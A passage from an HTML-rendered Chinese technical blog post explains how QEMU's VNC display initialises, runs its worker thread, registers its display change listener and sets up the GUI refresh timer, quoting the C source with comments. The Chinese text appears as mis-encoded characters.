class="keyword">sizeof</span>(*vd));</span><br><span class="line"></span><br><span class="line">    vd-&gt;id = strdup(id);</span><br><span class="line">    QTAILQ_INSERT_TAIL(&amp;vnc_displays, vd, next);  <span class="comment">// åŠ å…¥åˆ°å…¨å±€é“¾è¡¨ä¸­</span></span><br><span class="line"></span><br><span class="line">    QTAILQ_INIT(&amp;vd-&gt;clients);</span><br><span class="line">    vd-&gt;expires = TIME_MAX;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (keyboard_layout) &#123;  <span class="comment">// åˆå§‹åŒ–é”®ç›˜å¸ƒå±€</span></span><br><span class="line">        trace_vnc_key_map_init(keyboard_layout);</span><br><span class="line">        vd-&gt;kbd_layout = init_keyboard_layout(name2keysym,</span><br><span class="line">                                              keyboard_layout, errp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        vd-&gt;kbd_layout = init_keyboard_layout(name2keysym, <span class="string">&quot;en-us&quot;</span>, errp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!vd-&gt;kbd_layout) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vd-&gt;share_policy = VNC_SHARE_POLICY_ALLOW_EXCLUSIVE;</span><br><span class="line">    vd-&gt;connections_limit = <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    qemu_mutex_init(&amp;vd-&gt;mutex);</span><br><span class="line">    vnc_start_worker_thread();  <span class="comment">// å¯åŠ¨ VNC çš„ worker çº¿ç¨‹</span></span><br><span class="line"></span><br><span class="line">    vd-&gt;dcl.ops = &amp;dcl_ops; <span class="comment">// è®¾ç½® DisplayChangeListener çš„ ops</span></span><br><span class="line">    register_displaychangelistener(&amp;vd-&gt;dcl);</span><br><span class="line">    vd-&gt;kbd = qkbd_state_init(vd-&gt;dcl.con);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>åˆ›å»ºä¸€ä¸ª VncDisplayï¼ŒåŠ å…¥åˆ°å…¨å±€é“¾è¡¨ä¸­</li><li>åˆå§‹åŒ–é”®ç›˜å¸ƒå±€</li><li>å¯åŠ¨ VNC worker threadï¼ˆè‹¥æœªå¯åŠ¨ï¼‰ï¼Œç”± worker thread å°†å›¾åƒä¿¡æ¯å‘é€ç»™ client</li><li>è®¾ç½®è¯¥ VncDisplay å¯¹åº”çš„ DisplayChangeListener çš„ ops ä¸º <code>dcl_ops</code></li><li>è°ƒç”¨ <code>register_displaychangelistener()</code> æ³¨å†Œè¯¥ VncDisplay å¯¹åº”çš„ DisplayChangeListener</li></ul><h3 id="Iã€VNC-worker-thread-å°†å›¾åƒæ›´æ–°å‘é€ç»™å®¢æˆ·ç«¯"><a href="#Iã€VNC-worker-thread-å°†å›¾åƒæ›´æ–°å‘é€ç»™å®¢æˆ·ç«¯" class="headerlink" title="Iã€VNC worker thread - å°†å›¾åƒæ›´æ–°å‘é€ç»™å®¢æˆ·ç«¯"></a>Iã€VNC worker thread - å°†å›¾åƒæ›´æ–°å‘é€ç»™å®¢æˆ·ç«¯</h3><p><code>vnc worker thread</code> æ˜¯ Qemu ä¸­ VNC æœåŠ¡ä¸­çš„ä¸€ä¸ªé‡è¦çš„çº¿ç¨‹ï¼Œå…¶ç”¨ä»¥æŒç»­åœ°å¤„ç†æŒ‚è½½åœ¨å…¨å±€çš„ VncJobQueue ä¸Šçš„ VncJobï¼Œå¹¶å°†å›¾åƒæ›´æ–°æ•°æ®å‘é€ç»™ vnc å®¢æˆ·ç«¯</p><p>åœ¨ <code>vnc_display_init()</code> ä¸­åˆ›å»º VncDisplay å®ä¾‹æ—¶ï¼Œå…¶è¿˜ä¼šè°ƒç”¨ <code>vnc_start_worker_thread()</code> å¯åŠ¨ vnc worker threadï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">vnc_worker_thread_running</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">queue</span>; <span class="comment">/* Check global queue */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vnc_start_worker_thread</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    VncJobQueue *q;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (vnc_worker_thread_running())</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line"></span><br><span class="line">    q = vnc_queue_init();</span><br><span class="line">    qemu_thread_create(&amp;q-&gt;thread, <span class="string">&quot;vnc_worker&quot;</span>, vnc_worker_thread, q,</span><br><span class="line">                       QEMU_THREAD_DETACHED);</span><br><span class="line">    <span class="built_in">queue</span> = q; <span class="comment">/* Set global queue */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥çº¿ç¨‹çš„æœ¬ä½“ä¾¿æ˜¯ <code>vnc_worker_thread</code> å‡½æ•°ï¼Œä¸»è¦å°±æ˜¯ä¸€ä¸ªé‡å¤è°ƒç”¨ <code>vnc_worker_thread_loop</code> çš„å¤§å¾ªç¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">vnc_worker_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    VncJobQueue *<span class="built_in">queue</span> = arg;</span><br><span class="line"></span><br><span class="line">    qemu_thread_get_self(&amp;<span class="built_in">queue</span>-&gt;thread);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!vnc_worker_thread_loop(<span class="built_in">queue</span>)) ;</span><br><span class="line">    vnc_queue_clear(<span class="built_in">queue</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>vnc_worker_thread_loop</code> å®šä¹‰å¦‚ä¸‹ï¼Œè¯¥å‡½æ•°ä¼šä¸€ç›´ç­‰å¾…åˆ°å…¨å±€çš„ VncJobQueue çš„ VncJob é“¾è¡¨éç©ºï¼Œå•æ¬¡è°ƒç”¨å¤„ç†ä¸€ä¸ª VncJobï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">vnc_worker_thread_loop</span><span class="params">(VncJobQueue *<span class="built_in">queue</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    VncJob *job;</span><br><span class="line">    VncRectEntry *entry, *tmp;</span><br><span class="line">    VncState vs = &#123;&#125;;</span><br><span class="line">    <span class="type">int</span> n_rectangles;</span><br><span class="line">    <span class="type">int</span> saved_offset;</span><br><span class="line"></span><br><span class="line">    vnc_lock_queue(<span class="built_in">queue</span>);  <span class="comment">// ç­‰å¾…å…¨å±€ queue ä¸ä¸ºç©º</span></span><br><span class="line">    <span class="keyword">while</span> (QTAILQ_EMPTY(&amp;<span class="built_in">queue</span>-&gt;jobs) &amp;&amp; !<span class="built_in">queue</span>-&gt;<span class="built_in">exit</span>) &#123;</span><br><span class="line">        qemu_cond_wait(&amp;<span class="built_in">queue</span>-&gt;cond, &amp;<span class="built_in">queue</span>-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Here job can only be NULL if queue-&gt;exit is true */</span></span><br><span class="line">    job = QTAILQ_FIRST(&amp;<span class="built_in">queue</span>-&gt;jobs);  <span class="comment">// å–ä¸‹ç¬¬ä¸€ä¸ª job</span></span><br><span class="line">    vnc_unlock_queue(<span class="built_in">queue</span>);</span><br><span class="line">    assert(job-&gt;vs-&gt;magic == VNC_MAGIC);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">queue</span>-&gt;<span class="built_in">exit</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vnc_lock_output(job-&gt;vs);  <span class="comment">// é”ä¸Š VncState</span></span><br><span class="line">    <span class="keyword">if</span> (job-&gt;vs-&gt;ioc == <span class="literal">NULL</span> || job-&gt;vs-&gt;<span class="built_in">abort</span> == <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">// io channel ä¸ºç©ºæˆ– abort ä¸ºçœŸï¼Œæ–­å¼€è¿æ¥</span></span><br><span class="line">        vnc_unlock_output(job-&gt;vs);</span><br><span class="line">        <span class="keyword">goto</span> disconnected;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (buffer_empty(&amp;job-&gt;vs-&gt;output)) &#123;</span><br><span class="line">        <span class="comment">// è¿™é‡Œçš„ output ä¸º Buffer ç±»å‹ï¼Œç±»ä¼¼äº iovecï¼ŒåŒ…å«ç€é•¿åº¦ä¸ä¸€ä¸ªæŒ‡å‘ buffer çš„æŒ‡é’ˆ</span></span><br><span class="line">        <span class="comment">// buffer_move_empty(*to, *from) çš„ä½œç”¨å°±æ˜¯é‡Šæ”¾ to çš„ bufferï¼Œå°† from çš„ buffer ç»™åˆ° to çš„ buffer</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Looks like a NOP as it obviously moves no data.  But it</span></span><br><span class="line"><span class="comment">         * moves the empty buffer, so we don&#x27;t have to malloc a new</span></span><br><span class="line"><span class="comment">         * one for vs.output</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        buffer_move_empty(&amp;vs.output, &amp;job-&gt;vs-&gt;output);</span><br><span class="line">    &#125;</span><br><span class="line">    vnc_unlock_output(job-&gt;vs);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Make a local copy of vs and switch output buffers */</span></span><br><span class="line">    vnc_async_encoding_start(job-&gt;vs, &amp;vs);</span><br><span class="line">    vs.magic = VNC_MAGIC;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Start sending rectangles */</span></span><br><span class="line">    n_rectangles = <span class="number">0</span>;</span><br><span class="line">    vnc_write_u8(&amp;vs, VNC_MSG_SERVER_FRAMEBUFFER_UPDATE);</span><br><span class="line">    vnc_write_u8(&amp;vs, <span class="number">0</span>);</span><br><span class="line">    saved_offset = vs.output.offset;</span><br><span class="line">    vnc_write_u16(&amp;vs, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    vnc_lock_display(job-&gt;vs-&gt;vd);</span><br><span class="line">    <span class="comment">// éå†è¯¥ job ä¸Šçš„ VncRectï¼Œå‘é€ç»™ client</span></span><br><span class="line">    QLIST_FOREACH_SAFE(entry, &amp;job-&gt;rectangles, next, tmp) &#123;</span><br><span class="line">        <span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (job-&gt;vs-&gt;ioc == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// io channel ä¸ºç©ºï¼Œæ–­å¼€è¿æ¥</span></span><br><span class="line">            vnc_unlock_display(job-&gt;vs-&gt;vd);</span><br><span class="line">            <span class="comment">/* Copy persistent encoding data */</span></span><br><span class="line">            vnc_async_encoding_end(job-&gt;vs, &amp;vs);</span><br><span class="line">            <span class="keyword">goto</span> disconnected;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (vnc_worker_clamp_rect(&amp;vs, job, &amp;entry-&gt;rect)) &#123;</span><br><span class="line">            <span class="comment">// å‘é€ buffer</span></span><br><span class="line">            n = vnc_send_framebuffer_update(&amp;vs, entry-&gt;rect.x, entry-&gt;rect.y,</span><br><span class="line">                                            entry-&gt;rect.w, entry-&gt;rect.h);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (n &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                n_rectangles += n;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        g_free(entry);</span><br><span class="line">    &#125;</span><br><span class="line">    trace_vnc_job_nrects(&amp;vs, job, n_rectangles);</span><br><span class="line">    vnc_unlock_display(job-&gt;vs-&gt;vd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Put n_rectangles at the beginning of the message */</span></span><br><span class="line">    vs.output.buffer[saved_offset] = (n_rectangles &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">    vs.output.buffer[saved_offset + <span class="number">1</span>] = n_rectangles &amp; <span class="number">0xFF</span>;</span><br><span class="line"></span><br><span class="line">    vnc_lock_output(job-&gt;vs);</span><br><span class="line">    <span class="keyword">if</span> (job-&gt;vs-&gt;ioc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        buffer_move(&amp;job-&gt;vs-&gt;jobs_buffer, &amp;vs.output);</span><br><span class="line">        <span class="comment">/* Copy persistent encoding data */</span></span><br><span class="line">        vnc_async_encoding_end(job-&gt;vs, &amp;vs);</span><br><span class="line"></span><br><span class="line">        qemu_bh_schedule(job-&gt;vs-&gt;bh);</span><br><span class="line">    &#125;  <span class="keyword">else</span> &#123;</span><br><span class="line">        buffer_reset(&amp;vs.output);</span><br><span class="line">        <span class="comment">/* Copy persistent encoding data */</span></span><br><span class="line">        vnc_async_encoding_end(job-&gt;vs, &amp;vs);</span><br><span class="line">    &#125;</span><br><span class="line">    vnc_unlock_output(job-&gt;vs);</span><br><span class="line"></span><br><span class="line">disconnected:</span><br><span class="line">    vnc_lock_queue(<span class="built_in">queue</span>);</span><br><span class="line">    QTAILQ_REMOVE(&amp;<span class="built_in">queue</span>-&gt;jobs, job, next);</span><br><span class="line">    vnc_unlock_queue(<span class="built_in">queue</span>);</span><br><span class="line">    qemu_cond_broadcast(&amp;<span class="built_in">queue</span>-&gt;cond);</span><br><span class="line">    g_free(job);</span><br><span class="line">    vs.magic = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°çš„æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>æ£€æŸ¥å…¨å±€ queue çš„ job é“¾è¡¨æ˜¯å¦ä¸ºç©ºï¼Œè‹¥æ˜¯åˆ™è¿›å…¥ç¡çœ ç­‰å¾…</li><li>é”ä¸Šç¬¬ä¸€ä¸ª jobï¼Œæ£€æŸ¥å¯¹åº” VncState çš„ IO channel æ˜¯å¦ä¸ºç©ºï¼Œè‹¥æ˜¯åˆ™è·³åˆ°ç»“æŸå‘é€</li><li>è‹¥ VncState çš„ output buffer ï¼ˆBuffer ç±»å‹ï¼Œç±»ä¼¼äº iovecï¼Œæœ‰é•¿åº¦å’ŒæŒ‡å‘å®é™… buffer çš„æŒ‡é’ˆï¼‰çš„ offset ä¸º 0ï¼Œåˆ™å°†å…¶ç»™åˆ°å‡½æ•°å†…ä¸´æ—¶åˆ›å»ºçš„ VncState çš„ output bufferï¼ŒåŸ buffer è®¾ä¸º NULL</li><li>éå†è¯¥ job ä¸Šçš„ VncRectï¼Œå‘é€ç»™ clientï¼Œè‹¥ io channel ä¸ºç©ºï¼Œåˆ™è·³åˆ°ç»“æŸå‘é€</li><li>è‹¥ VncState çš„ io channel ä¸ä¸ºç©ºï¼Œåˆ™å°†å‡½æ•°å†…ä¸´æ—¶åˆ›å»ºçš„ VncState çš„ output buffer ç»™å›åŸ VncState</li><li>ï¼ˆç»“æŸå‘é€ï¼‰ä»å…¨å±€ queue ä¸Šå–ä¸‹è¯¥ job å¹¶é‡Šæ”¾</li></ul><h3 id="IIã€VNC-çš„-dcl-ops"><a href="#IIã€VNC-çš„-dcl-ops" class="headerlink" title="IIã€VNC çš„ dcl_ops"></a>IIã€VNC çš„ dcl_ops</h3><p>åœ¨ <code>vnc_display_init()</code> ä¸­åˆ›å»º VncDisplay å®ä¾‹æ—¶ä¼šå°†å…¶ DisplayChangeListener çš„å‡½æ•°è¡¨åˆå§‹åŒ–ä¸º <code>dcl_ops</code> å‡½æ•°è¡¨ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> DisplayChangeListenerOps dcl_ops = &#123;</span><br><span class="line">    .dpy_name             = <span class="string">&quot;vnc&quot;</span>,</span><br><span class="line">    .dpy_refresh          = vnc_refresh,</span><br><span class="line">    .dpy_gfx_update       = vnc_dpy_update,</span><br><span class="line">    .dpy_gfx_switch       = vnc_dpy_switch,</span><br><span class="line">    .dpy_gfx_check_format = qemu_pixman_check_format,</span><br><span class="line">    .dpy_mouse_set        = vnc_mouse_set,</span><br><span class="line">    .dpy_cursor_define    = vnc_dpy_cursor_define,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°çš„æ˜¯å…¶ä¸­ä¸»è¦éƒ½æ˜¯ä¸ vnc ç›¸å…³çš„æ“ä½œå‡½æ•°ï¼Œåé¢æ¶‰åŠåˆ°å…·ä½“å‡½æ•°æ—¶æˆ‘ä»¬å†å±•å¼€åˆ†æ</p><h3 id="IIIã€register-displaychangelistener-æ³¨å†Œ-dclï¼Œå¯åŠ¨-timer"><a href="#IIIã€register-displaychangelistener-æ³¨å†Œ-dclï¼Œå¯åŠ¨-timer" class="headerlink" title="IIIã€register_displaychangelistener - æ³¨å†Œ dclï¼Œå¯åŠ¨ timer"></a>IIIã€register_displaychangelistener - æ³¨å†Œ dclï¼Œå¯åŠ¨ timer</h3><p>è¯¥å‡½æ•°å®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">register_displaychangelistener</span><span class="params">(DisplayChangeListener *dcl)</span></span><br><span class="line">&#123;</span><br><span class="line">    QemuConsole *con;</span><br><span class="line"></span><br><span class="line">    assert(!dcl-&gt;ds);</span><br><span class="line"></span><br><span class="line">    trace_displaychangelistener_register(dcl, dcl-&gt;ops-&gt;dpy_name);</span><br><span class="line">    dcl-&gt;ds = get_alloc_displaystate();</span><br><span class="line">    QLIST_INSERT_HEAD(&amp;dcl-&gt;ds-&gt;listeners, dcl, next);</span><br><span class="line">    gui_setup_refresh(dcl-&gt;ds);</span><br><span class="line">    <span class="keyword">if</span> (dcl-&gt;con) &#123;</span><br><span class="line">        dcl-&gt;con-&gt;dcls++;</span><br><span class="line">        con = dcl-&gt;con;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        con = active_console;</span><br><span class="line">    &#125;</span><br><span class="line">    displaychangelistener_display_console(dcl, con, dcl-&gt;con ? &amp;error_fatal : <span class="literal">NULL</span>);</span><br><span class="line">    text_console_update_cursor(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦åšäº†è¿™äº›äº‹æƒ…ï¼š</p><ul><li>å°† dcl æ’åˆ°å¯¹åº” DisplayState çš„ listeners é“¾è¡¨ä¸Š</li><li>è°ƒç”¨ <code>gui_setup_refresh()</code> å¯åŠ¨ä¸€ä¸ª Qemu Timer</li><li>è°ƒç”¨ <code>displaychangelistener_display_console()</code> è¿›è¡Œç›¸å…³åˆå§‹åŒ–æ“ä½œï¼Œå…¶ä¸­ä¼šè°ƒç”¨ <code>dcl-&gt;ops</code> ä¸­å‡½æ•°</li></ul><p>æˆ‘ä»¬ä¸»è¦å…³æ³¨ <code>gui_setup_refresh()</code>ï¼Œå…¶ä¼šå¯åŠ¨ä¸€ä¸ª Qemu å®šæ—¶å™¨ï¼Œå®šæœŸåœ°åˆ·æ–° frame bufferï¼Œè¿™ä¹Ÿæ˜¯æ›´æ–°æ˜¾å¡æ•°æ®çš„æ ¸å¿ƒï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">gui_setup_refresh</span><span class="params">(DisplayState *ds)</span></span><br><span class="line">&#123;</span><br><span class="line">    DisplayChangeListener *dcl;</span><br><span class="line">    <span class="type">bool</span> need_timer = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">bool</span> have_gfx = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">bool</span> have_text = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    QLIST_FOREACH(dcl, &amp;ds-&gt;listeners, next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (dcl-&gt;ops-&gt;dpy_refresh != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            need_timer = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (dcl-&gt;ops-&gt;dpy_gfx_update != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            have_gfx = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (dcl-&gt;ops-&gt;dpy_text_update != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            have_text = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (need_timer &amp;&amp; ds-&gt;gui_timer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ds-&gt;gui_timer = timer_new_ms(QEMU_CLOCK_REALTIME, gui_update, ds);</span><br><span class="line">        timer_mod(ds-&gt;gui_timer, qemu_clock_get_ms(QEMU_CLOCK_REALTIME));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!need_timer &amp;&amp; ds-&gt;gui_timer != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        timer_free(ds-&gt;gui_timer);</span><br><span class="line">        ds-&gt;gui_timer = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ds-&gt;have_gfx = have_gfx;</span><br><span class="line">    ds-&gt;have_text = have_text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ dcl-&gt;ops çš„ <code>dpy_refresh</code> æŒ‡é’ˆéç©º<strong>ä¸”å½“å‰ DisplayState æœªè®¾ç½® timer æ—¶</strong>ï¼Œä¾¿ä¼šè°ƒç”¨ <code>timer_new_ms()</code> æ–°å»ºä¸€ä¸ªæ¯«ç§’çº§åˆ«çš„å®šæ—¶å™¨ï¼Œå®šæ—¶è°ƒç”¨ <code>gui_update()</code> åˆ·æ–°æ˜¾å­˜ï¼Œæ¥æ”¶çš„å‚æ•°ä¾¿ä¸ºè¯¥ DisplayState</p><h1 id="0x03-æ˜¾ç¤ºè®¾å¤‡æ›´æ–°ç›¸å…³å‡½æ•°"><a href="#0x03-æ˜¾ç¤ºè®¾å¤‡æ›´æ–°ç›¸å…³å‡½æ•°" class="headerlink" title="0x03.æ˜¾ç¤ºè®¾å¤‡æ›´æ–°ç›¸å…³å‡½æ•°"></a>0x03.æ˜¾ç¤ºè®¾å¤‡æ›´æ–°ç›¸å…³å‡½æ•°</h1><p>å‰é¢æˆ‘ä»¬è®²åˆ°ï¼Œåœ¨ Qemu å¯åŠ¨æ—¶ä¼šå¯åŠ¨ä¸€ä¸ª Timer å®šæ—¶è¿›è¡Œæ˜¾å­˜çš„åˆ·æ–°ï¼Œå…¶ä»£ç è°ƒç”¨å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/20/TVEaSGf7MgvjCO4.png" alt="image.png"></p><h2 id="ä¸€ã€gui-update-timer-å®šæ—¶è°ƒç”¨è¿›è¡Œæ›´æ–°æ“ä½œ"><a href="#ä¸€ã€gui-update-timer-å®šæ—¶è°ƒç”¨è¿›è¡Œæ›´æ–°æ“ä½œ" class="headerlink" title="ä¸€ã€gui_update - timer å®šæ—¶è°ƒç”¨è¿›è¡Œæ›´æ–°æ“ä½œ"></a>ä¸€ã€gui_update - timer å®šæ—¶è°ƒç”¨è¿›è¡Œæ›´æ–°æ“ä½œ</h2><p>æˆ‘ä»¬å…ˆæ¥çœ‹ <code>gui_update()</code> è¿™ä¸ªç”± timer å®šæ—¶è°ƒç”¨çš„å‡½æ•°ï¼Œå…¶å®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">gui_update</span><span class="params">(<span class="type">void</span> *opaque)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> interval = GUI_REFRESH_INTERVAL_IDLE;</span><br><span class="line">    <span 